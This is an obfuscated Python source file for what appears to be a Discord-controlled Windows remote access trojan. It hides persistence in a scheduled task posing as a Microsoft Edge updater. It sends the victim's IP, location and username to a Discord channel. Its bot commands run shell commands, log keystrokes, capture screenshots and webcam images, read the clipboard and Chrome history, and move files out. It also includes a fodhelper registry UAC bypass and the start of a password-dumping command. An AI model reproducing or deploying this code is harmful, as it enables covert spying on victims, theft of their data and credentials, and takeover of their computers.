import win32con #line:2
import win32gui #line:3
import win32cred #line:4
import win32api #line:5
import win32crypt #line:6
import win32com .client #line:7
import requests #line:8
import inspect #line:9
import ctypes #line:10
import ctypes .wintypes #line:11
import sys #line:12
import os #line:13
import ssl #line:14
import threading #line:15
import time #line:16
import cv2 #line:17
import subprocess #line:18
import asyncio #line:19
import json #line:20
import logging #line:21
import platform #line:22
import urllib .request #line:23
import discord #line:24
import pyautogui #line:25
import re #line:26
import sqlite3 #line:27
import shutil #line:28
import browser_cookie3 #line:29
import pywintypes #line:30
import io #line:31
import shutil #line:32
import sounddevice as sd #line:33
import numpy as np #line:34
import win32com .client as wincl #line:35
from dotenv import load_dotenv #line:36
from discord .ext import commands #line:37
from requests import get #line:38
from pynput .keyboard import Key ,Controller ,Listener #line:39
from scipy .io .wavfile import write #line:40
from ctypes import *#line:41
from mss import mss #line:42
from lazagne .config import run #line:43
load_dotenv ()#line:45
CRED_TYPE_GENERIC =win32cred .CRED_TYPE_GENERIC #line:46
token =os .environ .get ("DISCORD_TOKEN")#line:47
global isexe #line:48
isexe =False #line:49
if (sys .argv [0 ].endswith ("exe")):#line:50
    isexe =True #line:51
global appdata #line:52
global temp #line:53
appdata =os .getenv ('APPDATA')#line:54
temp =os .getenv ('temp')#line:55
client =discord .Client ()#line:56
bot =commands .Bot (command_prefix ='!')#line:57
ssl ._create_default_https_context =ssl ._create_unverified_context #line:58
async def activity (O00000OO000000O00 ):#line:60
    while True :#line:61
        global stop_threads #line:62
        if stop_threads :#line:63
            break #line:64
        OOO00O0OOOOO0O0OO =win32gui .GetWindowText (win32gui .GetForegroundWindow ())#line:65
        OOOO0OO000000OO00 =discord .Game (f"Visiting: {OOO00O0OOOOO0O0OO}")#line:66
        await O00000OO000000O00 .change_presence (status =discord .Status .online ,activity =OOOO0OO000000OO00 )#line:67
        time .sleep (1 )#line:68
def between_callback (OOOO00OO0O0OOO00O ):#line:70
    O0O0OO00OO00O000O =asyncio .new_event_loop ()#line:71
    asyncio .set_event_loop (O0O0OO00OO00O000O )#line:72
    O0O0OO00OO00O000O .run_until_complete (activity (OOOO00OO0O0OOO00O ))#line:73
    O0O0OO00OO00O000O .close ()#line:74
@client .event #line:76
async def on_ready ():#line:77
    create_persistence ()#line:78
    O00OO0O0O00OO0OO0 =[]#line:79
    global number #line:80
    number =1 #line:81
    global channel_name #line:82
    channel_name =None #line:83
    with urllib .request .urlopen ("https://geolocation-db.com/json")as OO0OOOOOO0O0OOO0O :#line:84
        O0O00000OOOOOO00O =json .loads (OO0OOOOOO0O0OOO0O .read ().decode ())#line:85
        O0OOO00O0O00O00O0 =O0O00000OOOOOO00O ['country_code']#line:86
        O0OOO0000OOOO000O =O0O00000OOOOOO00O ['IPv4']#line:87
    for OO00000OOOO000OO0 in client .get_all_channels ():#line:88
        if OO00000OOOO000OO0 .name .startswith ("session"):#line:89
            OO000OOOO0000O0OO =await OO00000OOOO000OO0 .history (oldest_first =True ,limit =10 ).flatten ()#line:90
            OOOO00OOO0O0O00OO =re .compile ("(?<=IP:\s)\S*")#line:91
            O0OOOO0OO000000OO =OOOO00OOO0O0O00OO .search (OO000OOOO0000O0OO [0 ].content )#line:92
            if O0OOOO0OO000000OO and O0OOOO0OO000000OO .group (0 )==O0OOO0000OOOO000O :#line:93
                channel_name =OO00000OOOO000OO0 .name #line:94
        O00OO0O0O00OO0OO0 .append (OO00000OOOO000OO0 .name )#line:95
    if channel_name is None :#line:96
        for OOO0000OOOOO000OO in range (len (O00OO0O0O00OO0OO0 )):#line:97
            if O00OO0O0O00OO0OO0 [OOO0000OOOOO000OO ].startswith ("session"):#line:98
                OOO00OO0OOO0O0O00 =[O00000OOOO0O00OO0 for O00000OOOO0O00OO0 in re .split ("[^0-9]",O00OO0O0O00OO0OO0 [OOO0000OOOOO000OO ])if O00000OOOO0O00OO0 !='']#line:99
                OOO00OOO0OOO0O000 =max (map (int ,OOO00OO0OOO0O0O00 ))#line:100
                number =OOO00OOO0OOO0O000 +1 #line:101
            else :#line:102
                pass #line:103
        channel_name =f"session-{number}"#line:104
        OO00OOO0O0OO00O00 =await client .guilds [0 ].create_text_channel (channel_name )#line:105
    OO00O0000O0O0O00O =discord .utils .get (client .get_all_channels (),name =channel_name )#line:106
    O0O00OO00O0O0O00O =client .get_channel (OO00O0000O0O0O00O .id )#line:107
    OO000O00OO000OOO0 =ctypes .windll .shell32 .IsUserAnAdmin ()!=0 #line:108
    OOO00000O0O000O0O =f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{O0OOO00O0O00O00O0.lower()}: | User : {os.getlogin()} | IP: {O0OOO0000OOOO000O}"#line:109
    if OO000O00OO000OOO0 ==True :#line:110
        await O0O00OO00O0O0O00O .send (f'{OOO00000O0O000O0O} | admin!')#line:111
    elif OO000O00OO000OOO0 ==False :#line:112
        await O0O00OO00O0O0O00O .send (OOO00000O0O000O0O )#line:113
    O0O00O00O0O0OO0O0 =discord .Game (f"Window logging stopped")#line:114
    await client .change_presence (status =discord .Status .online ,activity =O0O00O00O0O0OO0O0 )#line:115
def create_persistence ():#line:117
    O0OOOO0O0OO0O000O =sys .argv [0 ]#line:118
    OO00OO0O0OOOOOOOO =os .path .basename (O0OOOO0O0OO0O000O )#line:119
    OO0OOO00OOO0OO000 =os .getenv ('APPDATA')#line:120
    OOO00OOOOOOOOO00O =OO0OOO00OOO0OO000 +"\..\Local\Packages\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe7fc2\AC\Temp"#line:121
    if not os .path .isdir (OOO00OOOOOOOOO00O ):#line:122
        os .makedirs (OOO00OOOOOOOOO00O ,exist_ok =True )#line:123
    OOO0O00OOO0OOOOO0 =OOO00OOOOOOOOO00O +"\\"+OO00OO0O0OOOOOOOO #line:124
    if not os .path .isfile (OOO0O00OOO0OOOOO0 ):#line:125
        shutil .copy (O0OOOO0O0OO0O000O ,OOO00OOOOOOOOO00O )#line:126
    O0O00O00O000OO000 =""#line:128
    OO00OO0O0OO0OOOO0 =""#line:129
    OOOO0OO0OO0OO0OOO =""#line:130
    OOO00O0OOOO000000 =""#line:131
    O0O0O00OO00OO0O0O ="MicrosoftEdgeUpdateTaskMachineUA2"#line:132
    O00000O0O0O0O00O0 =OOO0O00OOO0OOOOO0 #line:133
    OOO000OO00O00O0OO =r''#line:134
    O000O0O0O0OOO0OOO =r"c:\windows\system32"#line:135
    O000O0OOO0O00O00O =""#line:136
    OO0O000OO000OO00O ="Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it."#line:137
    O0OO00OO0OO00O0O0 ="MicrosoftEdgeUpdateTaskMachineUA2"#line:138
    OO0O00OO00O0OOO00 =False #line:139
    O0O0O0OOO00O00000 =9 #line:142
    OO00000OOO0OOO0O0 =6 #line:143
    O00OOO00000OOO00O =0 #line:144
    O0OO00000OO00OO0O =3 #line:145
    OOOOOO0O0O0OO0OOO =win32com .client .Dispatch ("Schedule.Service")#line:148
    OOOOOO0O0O0OO0OOO .Connect (O0O00O00O000OO000 or None ,OO00OO0O0OO0OOOO0 or None ,OOOO0OO0OO0OO0OOO or None ,OOO00O0OOOO000000 or None )#line:149
    OO00O00O00OOO0OO0 =OOOOOO0O0O0OO0OOO .GetFolder ("\\")#line:150
    O00000OOOOO00OO0O =OOOOOO0O0O0OO0OOO .NewTask (0 )#line:153
    OOOOO0OO0O0OOO00O =O00000OOOOO00OO0O .Triggers #line:154
    O000OOO0OOO0O0O00 =OOOOO0OO0O0OOO00O .Create (O0O0O0OOO00O00000 )#line:156
    O000OOO0OOO0O0O00 .Id ="LogonTriggerId"#line:157
    O000OOO0OOO0O0O00 .UserId =os .environ .get ('USERNAME')#line:158
    OOO000O00O00000OO =O00000OOOOO00OO0O .Actions #line:161
    O000OOOO0O00O00O0 =OOO000O00O00000OO .Create (O00OOO00000OOO00O )#line:162
    O000OOOO0O00O00O0 .ID =O0O0O00OO00OO0O0O #line:163
    O000OOOO0O00O00O0 .Path =O00000O0O0O0O00O0 #line:164
    O000OOOO0O00O00O0 .WorkingDirectory =O000O0O0O0OOO0OOO #line:165
    O000OOOO0O00O00O0 .Arguments =OOO000OO00O00O0OO #line:166
    O000O0O0OO0000O00 =O00000OOOOO00OO0O .RegistrationInfo #line:168
    O000O0O0OO0000O00 .Author =O000O0OOO0O00O00O #line:169
    O000O0O0OO0000O00 .Description =OO0O000OO000OO00O #line:170
    OO00000OOO00O00OO =O00000OOOOO00OO0O .Settings #line:172
    OO00000OOO00O00OO .Hidden =OO0O00OO00O0OOO00 #line:174
    O0OO0O0OO0O00O00O =OO00O00O00OOO0OO0 .RegisterTaskDefinition (O0OO00OO0OO00O0O0 ,O00000OOOOO00OO0O ,OO00000OOO0OOO0O0 ,"","",O0OO00000OO00OO0O )#line:178
@client .event #line:180
async def on_message (O00OO0O000OO00O0O ):#line:181
    if O00OO0O000OO00O0O .channel .name !=channel_name :#line:182
        pass #line:183
    else :#line:184
        OO0O00OO00OOOO0OO =[]#line:185
        for O00O0000OO0OOO0OO in client .get_all_channels ():#line:186
            OO0O00OO00OOOO0OO .append (O00O0000OO0OOO0OO .name )#line:187
        if O00OO0O000OO00O0O .content .startswith ("!kill"):#line:188
            try :#line:189
                if O00OO0O000OO00O0O .content [6 :]=="all":#line:190
                    for OOO00OOOO0OO00000 in range (len (OO0O00OO00OOOO0OO )):#line:191
                        if "session"in OO0O00OO00OOOO0OO [OOO00OOOO0OO00000 ]:#line:192
                            OO0OO0OOO00OOOOO0 =discord .utils .get (client .get_all_channels (),name =OO0O00OO00OOOO0OO [OOO00OOOO0OO00000 ])#line:193
                            await OO0OO0OOO00OOOOO0 .delete ()#line:194
                        else :#line:195
                            pass #line:196
                else :#line:197
                    OO0OO0OOO00OOOOO0 =discord .utils .get (client .get_all_channels (),name =O00OO0O000OO00O0O .content [6 :])#line:198
                    await OO0OO0OOO00OOOOO0 .delete ()#line:199
                    await O00OO0O000OO00O0O .channel .send (f"[*] {O00OO0O000OO00O0O.content[6:]} killed.")#line:200
            except :#line:201
                await O00OO0O000OO00O0O .channel .send (f"[!] {O00OO0O000OO00O0O.content[6:]} is invalid,please enter a valid session name")#line:202
        if O00OO0O000OO00O0O .content =="!dumpkeylogger":#line:204
            O0OO000000OOOO0O0 =os .getenv ("TEMP")#line:205
            O0000O0OOO0OO0O00 =O0OO000000OOOO0O0 +r"\key_log.txt"#line:206
            OO0OO0OO00000OO0O =discord .File (O0000O0OOO0OO0O00 ,filename ="key_log.txt")#line:207
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:208
            os .remove (O0000O0OOO0OO0O00 )#line:209
        if O00OO0O000OO00O0O .content =="!exit":#line:211
            sys .exit ()#line:212
        if O00OO0O000OO00O0O .content =="!windowstart":#line:214
            global stop_threads #line:215
            stop_threads =False #line:216
            global _O0OO00000O00O0O0O #line:217
            _O0OO00000O00O0O0O =threading .Thread (target =between_callback ,args =(client ,))#line:218
            _O0OO00000O00O0O0O .start ()#line:219
            await O00OO0O000OO00O0O .channel .send ("[*] Window logging for this session started")#line:220
        if O00OO0O000OO00O0O .content =="!windowstop":#line:222
            stop_threads =True #line:223
            await O00OO0O000OO00O0O .channel .send ("[*] Window logging for this session stopped")#line:224
            O0OO00000000OO00O =discord .Game (f"Window logging stopped")#line:225
            await client .change_presence (status =discord .Status .online ,activity =O0OO00000000OO00O )#line:226
        if O00OO0O000OO00O0O .content =="!screenshot":#line:228
            with mss ()as O00OO000OO00O0000 :#line:229
                O00OO000OO00O0000 .shot (output =os .path .join (os .getenv ('TEMP')+r"\monitor.png"))#line:230
            O0000O000000O0O0O =(os .getenv ('TEMP'))+r"\monitor.png"#line:231
            OO0OO0OO00000OO0O =discord .File ((O0000O000000O0O0O ),filename ="monitor.png")#line:232
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:233
            os .remove (O0000O000000O0O0O )#line:234
        if O00OO0O000OO00O0O .content =="!webcampic":#line:236
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:237
            OO0000O00O000OOOO =0 #line:238
            O0OO000OO0OOO0O0O =cv2 .VideoCapture (OO0000O00O000OOOO )#line:239
            O0O00OO0O0OO00OOO ,O0O00000O0OO0OOO0 =O0OO000OO0OOO0O0O .read ()#line:241
            cv2 .imwrite (O0OO000000OOOO0O0 +r"\temp.png",O0O00000O0OO0OOO0 )#line:242
            del (O0OO000OO0OOO0O0O )#line:243
            OO0OO0OO00000OO0O =discord .File (O0OO000000OOOO0O0 +r"\temp.png",filename ="temp.png")#line:244
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:245
        if O00OO0O000OO00O0O .content .startswith ("!message"):#line:246
            O000OO0000OOOOOOO =0x04 #line:247
            OOOOOO0O00OOOOOOO =0x4000 #line:248
            OO0OO0OO000OO0OOO =0x10 #line:249
            def OO0OO000OOOO0OOOO ():#line:250
                ctypes .windll .user32 .MessageBoxW (0 ,O00OO0O000OO00O0O .content [8 :],"Error",OOOOOO0O00OOOOOOO |O000OO0000OOOOOOO |OO0OO0OO000OO0OOO )#line:251
            O00000OOOO0000OOO =threading .Thread (target =OO0OO000OOOO0OOOO )#line:252
            O00000OOOO0000OOO ._running =True #line:253
            O00000OOOO0000OOO .daemon =True #line:254
            O00000OOOO0000OOO .start ()#line:255
            def O000OO000O00OOO00 (OOOOO00O00OO0OOO0 ,O00OOO0OO00O000OO ):#line:256
                def OOO000OOO0O0000OO (OO00OO0O00OOO0000 ,O0O000O0O00O0OOOO ):#line:257
                    if win32gui .GetWindowText (OO00OO0O00OOO0000 )=="Error":#line:258
                        win32gui .ShowWindow (OO00OO0O00OOO0000 ,win32con .SW_RESTORE )#line:259
                        win32gui .SetWindowPos (OO00OO0O00OOO0000 ,win32con .HWND_NOTOPMOST ,0 ,0 ,0 ,0 ,win32con .SWP_NOMOVE +win32con .SWP_NOSIZE )#line:260
                        win32gui .SetWindowPos (OO00OO0O00OOO0000 ,win32con .HWND_TOPMOST ,0 ,0 ,0 ,0 ,win32con .SWP_NOMOVE +win32con .SWP_NOSIZE )#line:261
                        win32gui .SetWindowPos (OO00OO0O00OOO0000 ,win32con .HWND_NOTOPMOST ,0 ,0 ,0 ,0 ,win32con .SWP_SHOWWINDOW +win32con .SWP_NOMOVE +win32con .SWP_NOSIZE )#line:262
                        return None #line:263
                    else :#line:264
                        pass #line:265
                if win32gui .IsWindow (OOOOO00O00OO0OOO0 )and win32gui .IsWindowEnabled (OOOOO00O00OO0OOO0 )and win32gui .IsWindowVisible (OOOOO00O00OO0OOO0 ):#line:266
                    win32gui .EnumWindows (OOO000OOO0O0000OO ,None )#line:267
            win32gui .EnumWindows (O000OO000O00OOO00 ,0 )#line:268
        if O00OO0O000OO00O0O .content .startswith ("!upload"):#line:270
            await O00OO0O000OO00O0O .attachments [0 ].save (O00OO0O000OO00O0O .content [8 :])#line:271
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:272
        if O00OO0O000OO00O0O .content .startswith ("!shell"):#line:274
            global status #line:275
            status =None #line:276
            OOO0OOO0O00O0OOOO =O00OO0O000OO00O0O .content [7 :]#line:277
            def O00O0O00OOO0OO0OO (O0O0OO00OO0000O00 ):#line:278
                O0O00O0O0O0OO0000 =subprocess .run (O0O0OO00OO0000O00 ,stdout =subprocess .PIPE ,shell =True ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:279
                global status #line:280
                status ="ok"#line:281
                return O0O00O0O0O0OO0000 .stdout .decode ('CP437').strip ()#line:282
            O0O0O0OOO0OOOO00O =O00O0O00OOO0OO0OO (OOO0OOO0O00O0OOOO )#line:283
            print (O0O0O0OOO0OOOO00O )#line:284
            print (status )#line:285
            if status :#line:286
                OO0OOO0OO0OO0OOOO =len (O0O0O0OOO0OOOO00O )#line:287
                if OO0OOO0OO0OO0OOOO <1 :#line:288
                    await O00OO0O000OO00O0O .channel .send ("[*] Command not recognized or no output was obtained")#line:289
                elif OO0OOO0OO0OO0OOOO >1990 :#line:290
                    O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:291
                    OO0OOOOOOOO0OO00O =open (O0OO000000OOOO0O0 +r"\output.txt",'a')#line:292
                    OO0OOOOOOOO0OO00O .write (O0O0O0OOO0OOOO00O )#line:293
                    OO0OOOOOOOO0OO00O .close ()#line:294
                    OO0OO0OO00000OO0O =discord .File (O0OO000000OOOO0O0 +r"\output.txt",filename ="output.txt")#line:295
                    await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:296
                    os .remove (O0OO000000OOOO0O0 +r"\output.txt")#line:297
                else :#line:298
                    await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed : "+O0O0O0OOO0OOOO00O )#line:299
            else :#line:300
                await O00OO0O000OO00O0O .channel .send ("[*] Command not recognized or no output was obtained")#line:301
                status =None #line:302
        if O00OO0O000OO00O0O .content .startswith ("!download"):#line:304
            OOOO0OO00OO0O0OOO =O00OO0O000OO00O0O .content [10 :]#line:305
            OOOO0O0O00OO0O0OO =os .stat (OOOO0OO00OO0O0OOO ).st_size #line:306
            if OOOO0O0O00OO0O0OO >7340032 :#line:307
                await O00OO0O000OO00O0O .channel .send ("this may take some time becuase it is over 8 MB. please wait")#line:308
                O000OOO00O0000O0O =requests .post ('https://file.io/',files ={"file":open (OOOO0OO00OO0O0OOO ,"rb")}).json ()["link"]#line:309
                await O00OO0O000OO00O0O .channel .send ("download link: "+O000OOO00O0000O0O )#line:310
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:311
            else :#line:312
                OO0OO0OO00000OO0O =discord .File (O00OO0O000OO00O0O .content [10 :],filename =O00OO0O000OO00O0O .content [10 :])#line:313
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:314
        if O00OO0O000OO00O0O .content .startswith ("!cd"):#line:316
            os .chdir (O00OO0O000OO00O0O .content [4 :])#line:317
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:318
        if O00OO0O000OO00O0O .content =="!help":#line:320
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:321
            O000O0OOOO0OOOO0O =open (O0OO000000OOOO0O0 +r"\helpmenu.txt",'a')#line:322
            O000O0OOOO0OOOO0O .write (str (helpmenu ))#line:323
            O000O0OOOO0OOOO0O .close ()#line:324
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:325
            OO0OO0OO00000OO0O =discord .File (O0OO000000OOOO0O0 +r"\helpmenu.txt",filename ="helpmenu.txt")#line:326
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:327
            os .remove (O0OO000000OOOO0O0 +r"\helpmenu.txt")#line:328
        if O00OO0O000OO00O0O .content .startswith ("!write"):#line:330
            if O00OO0O000OO00O0O .content [7 :]=="enter":#line:331
                pyautogui .press ("enter")#line:332
            else :#line:333
                pyautogui .typewrite (O00OO0O000OO00O0O .content [7 :])#line:334
        if O00OO0O000OO00O0O .content =="!history":#line:336
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:337
            O0OOO000O00O0O0OO =(os .getenv ('USERNAME'))#line:338
            shutil .rmtree (O0OO000000OOOO0O0 +r"\history12",ignore_errors =True )#line:339
            os .mkdir (O0OO000000OOOO0O0 +r"\history12")#line:340
            O0OO0OO00O000O00O =r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format (O0OOO000O00O0O0OO )#line:341
            O0O00000O0OO0O0OO =O0OO000000OOOO0O0 +r"\history12"#line:342
            O0OO0O000O0O000OO =(("copy"+O0OO0OO00O000O00O +"\"{}\"").format (O0O00000O0OO0O0OO ))#line:343
            os .system (O0OO0O000O0O000OO )#line:344
            O000OOOO0OO000O00 =sqlite3 .connect (O0O00000O0OO0O0OO +r"\history")#line:345
            OO00O0OO000O00OO0 =O000OOOO0OO000O00 .cursor ()#line:346
            OO00O0OO000O00OO0 .execute ("SELECT url FROM urls")#line:347
            O0O0000O0OO0O0OOO =OO00O0OO000O00OO0 .fetchall ()#line:348
            for O00O0000OO0OOO0OO in O0O0000O0OO0O0OOO :#line:349
                OO00OO00O00OO0000 =("".join (O00O0000OO0OOO0OO ))#line:350
                OO0OOO0OOO00O00OO =open (O0OO000000OOOO0O0 +r"\history12"+r"\history.txt",'a')#line:351
                OO0OOO0OOO00O00OO .write (str (OO00OO00O00OO0000 ))#line:352
                OO0OOO0OOO00O00OO .write (str ("\n"))#line:353
                OO0OOO0OOO00O00OO .close ()#line:354
            O000OOOO0OO000O00 .close ()#line:355
            OO0OO0OO00000OO0O =discord .File (O0OO000000OOOO0O0 +r"\history12"+r"\history.txt",filename ="history.txt")#line:356
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:357
            def OOO0OO00O00OO0O0O ():#line:358
                OOOOOOOO0OO0OO00O ="rmdir "+O0OO000000OOOO0O0 +r"\history12"+" /s /q"#line:359
                os .system (OOOOOOOO0OO0OO00O )#line:360
            OOO0OO00O00OO0O0O ()#line:361
        if O00OO0O000OO00O0O .content =="!clipboard":#line:362
            OO00OO000O00OO00O =1 #line:363
            O0000000O000O0000 =ctypes .windll .kernel32 #line:364
            O0000000O000O0000 .GlobalLock .argtypes =[ctypes .c_void_p ]#line:365
            O0000000O000O0000 .GlobalLock .restype =ctypes .c_void_p #line:366
            O0000000O000O0000 .GlobalUnlock .argtypes =[ctypes .c_void_p ]#line:367
            O00OOO0OO0O000O00 =ctypes .windll .user32 #line:368
            O00OOO0OO0O000O00 .GetClipboardData .restype =ctypes .c_void_p #line:369
            O00OOO0OO0O000O00 .OpenClipboard (0 )#line:370
            if O00OOO0OO0O000O00 .IsClipboardFormatAvailable (OO00OO000O00OO00O ):#line:371
                OOO0OOO0000000O0O =O00OOO0OO0O000O00 .GetClipboardData (OO00OO000O00OO00O )#line:372
                O0O00O00OOO0O0000 =O0000000O000O0000 .GlobalLock (OOO0OOO0000000O0O )#line:373
                O0O00000OO0OOOOO0 =ctypes .c_char_p (O0O00O00OOO0O0000 )#line:374
                OO0000OOOO0O0000O =O0O00000OO0OOOOO0 .value #line:375
                O0000000O000O0000 .GlobalUnlock (O0O00O00OOO0O0000 )#line:376
                OO00OOOO0O0OOOO00 =OO0000OOOO0O0000O .decode ()#line:377
                O00OOO0OO0O000O00 .CloseClipboard ()#line:378
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed : "+"Clipboard content is : "+str (OO00OOOO0O0OOOO00 ))#line:379
        if O00OO0O000OO00O0O .content =="!sysinfo":#line:381
            O0O0000OOO00OO000 =str (platform .uname ())#line:382
            OOOO000OOOOO00OO0 =O0O0000OOO00OO000 [12 :]#line:383
            OO0O00O0OOO0O000O =get ('https://api.ipify.org').text #line:384
            O00O000O0O0O00OOO ="IP Address = "+OO0O00O0OOO0O000O #line:385
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed : "+OOOO000OOOOO00OO0 +O00O000O0O0O00OOO )#line:386
        if O00OO0O000OO00O0O .content =="!geolocate":#line:388
            with urllib .request .urlopen ("https://geolocation-db.com/json")as O000000OOO0O0OOO0 :#line:389
                OOO0OOO0000000O0O =json .loads (O000000OOO0O0OOO0 .read ().decode ())#line:390
                OO00OOOOOOO0O00OO =f"http://www.google.com/maps/place/{OOO0OOO0000000O0O['latitude']},{OOO0OOO0000000O0O['longitude']}"#line:391
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed : "+OO00OOOOOOO0O00OO )#line:392
        if O00OO0O000OO00O0O .content =="!admincheck":#line:394
            O0OO0O0O00OO000O0 =ctypes .windll .shell32 .IsUserAnAdmin ()!=0 #line:395
            if O0OO0O0O00OO000O0 ==True :#line:396
                await O00OO0O000OO00O0O .channel .send ("[*] Congrats you're admin")#line:397
            elif O0OO0O0O00OO000O0 ==False :#line:398
                await O00OO0O000OO00O0O .channel .send ("[!] Sorry, you're not admin")#line:399
        if O00OO0O000OO00O0O .content =="!uacbypass":#line:401
            def OOOOOO0O00OOOO00O ():#line:402
                try :#line:403
                    O000OOOO0OOO00OO0 =(os .getuid ()==0 )#line:404
                except AttributeError :#line:405
                    O000OOOO0OOO00OO0 =ctypes .windll .shell32 .IsUserAnAdmin ()!=0 #line:406
                return O000OOOO0OOO00OO0 #line:407
            if OOOOOO0O00OOOO00O ():#line:408
                await O00OO0O000OO00O0O .channel .send ("Your already admin!")#line:409
            else :#line:410
                class O0OOO00OO0O00O0OO ():#line:411
                    disable =ctypes .windll .kernel32 .Wow64DisableWow64FsRedirection #line:412
                    revert =ctypes .windll .kernel32 .Wow64RevertWow64FsRedirection #line:413
                    def __enter__ (OOO00OO00O000O0O0 ):#line:414
                        OOO00OO00O000O0O0 .old_value =ctypes .c_long ()#line:415
                        OOO00OO00O000O0O0 .success =OOO00OO00O000O0O0 .disable (ctypes .byref (OOO00OO00O000O0O0 .old_value ))#line:416
                    def __exit__ (OO00OO000OOO0000O ,O0O0OOOOO0O0O0000 ,OO0OOO0OOO0O00000 ,O0OO0OO00000O0O0O ):#line:417
                        if OO00OO000OOO0000O .success :#line:418
                            OO00OO000OOO0000O .revert (OO00OO000OOO0000O .old_value )#line:419
                await O00OO0O000OO00O0O .channel .send ("attempting to get admin!")#line:420
                O00000O0OO0OOOO00 =False #line:421
                if (sys .argv [0 ].endswith ("exe")):#line:422
                    O00000O0OO0OOOO00 =True #line:423
                if not O00000O0OO0OOOO00 :#line:424
                    OOO00O00OO0O00OOO =sys .argv [0 ]#line:425
                    OO0OOOO00000OOOOO =inspect .getframeinfo (inspect .currentframe ()).filename #line:426
                    O00000OOOOO0O00O0 =OO0OOOO00000OOOOO #line:427
                    OOO0O0OO00OOO0O0O =""" powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """#line:428
                    os .system (OOO0O0OO00OOO0O0O )#line:429
                    O00O0000000O0OOOO =""" powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """#line:430
                    os .system (O00O0000000O0OOOO )#line:431
                    OO000O0O0O0000OO0 ="""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """+'""'+'"'+'"'+O00000OOOOO0O00O0 +'""'+'"'+'"\'"'+""" -Force"""#line:432
                    os .system (OO000O0O0O0000OO0 )#line:433
                else :#line:434
                    OOO00O00OO0O00OOO =sys .argv [0 ]#line:435
                    OO0OOOO00000OOOOO =OOO00O00OO0O00OOO #line:436
                    O00000OOOOO0O00O0 =OO0OOOO00000OOOOO #line:437
                    OOO0O0OO00OOO0O0O =""" powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """#line:438
                    os .system (OOO0O0OO00OOO0O0O )#line:439
                    O00O0000000O0OOOO =""" powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """#line:440
                    os .system (O00O0000000O0OOOO )#line:441
                    OO000O0O0O0000OO0 ="""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """+'""'+'"'+'"'+O00000OOOOO0O00O0 +'""'+'"'+'"\'"'+""" -Force"""#line:442
                    os .system (OO000O0O0O0000OO0 )#line:443
                with O0OOO00OO0O00O0OO ():#line:444
                    os .system ("fodhelper.exe")#line:445
                time .sleep (2 )#line:446
                O00O0O0000O000OOO =""" powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """#line:447
                os .system (O00O0O0000O000OOO )#line:448
        if O00OO0O000OO00O0O .content =="!startkeylogger":#line:449
            O0OO000000OOOO0O0 =os .getenv ("TEMP")#line:450
            OO00O0OO0O00000O0 =O0OO000000OOOO0O0 #line:451
            logging .basicConfig (filename =(OO00O0OO0O00000O0 +r"\key_log.txt"),level =logging .DEBUG ,format ='%(asctime)s: %(message)s')#line:453
            def OO0O00OOOOO000OOO ():#line:454
                def OOOO0O0O0O0OO00O0 (OO000O0O00000O0O0 ):#line:455
                    logging .info (str (OO000O0O00000O0O0 ))#line:456
                with Listener (on_press =OOOO0O0O0O0OO00O0 )as OOO000O00O000O000 :#line:457
                    OOO000O00O000O000 .join ()#line:458
            global test #line:459
            test =threading .Thread (target =OO0O00OOOOO000OOO )#line:460
            test ._running =True #line:461
            test .daemon =True #line:462
            test .start ()#line:463
            await O00OO0O000OO00O0O .channel .send ("[*] Keylogger successfuly started")#line:464
        if O00OO0O000OO00O0O .content =="!stopkeylogger":#line:466
            test ._running =False #line:467
            await O00OO0O000OO00O0O .channel .send ("[*] Keylogger successfuly stopped")#line:468
        if O00OO0O000OO00O0O .content .startswith ("!voice"):#line:470
            OOO0OO000OO0OO00O =wincl .Dispatch ("SAPI.SpVoice")#line:471
            OOO0OO000OO0OO00O .Speak (O00OO0O000OO00O0O .content [7 :])#line:472
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:474
        if O00OO0O000OO00O0O .content =="!passwords":#line:476
            O0OO000000OOOO0O0 =os .getenv ('temp')#line:477
            def O00O0O00OOO0OO0OO (OOO00OOO0O00OOO00 ):#line:478
